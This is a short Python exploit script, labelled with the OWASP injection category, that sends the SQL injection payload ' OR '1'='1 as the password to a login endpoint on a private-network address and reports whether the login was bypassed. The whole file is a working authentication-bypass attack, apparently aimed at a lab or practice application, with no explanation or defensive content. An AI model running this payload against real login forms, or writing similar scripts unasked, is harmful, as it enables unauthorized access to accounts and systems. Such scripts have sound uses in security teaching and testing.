#OWASP A03:2021 - Injection

import requests

url = 'http://192.168.1.8:5000/login'
data = {
    'password': "' OR '1'='1",
    'username': 'assad'
}
r = requests.post(url, data=data)
print("[+] Login bypassed!" if "Olá" in r.text else "[-] Falhou.")
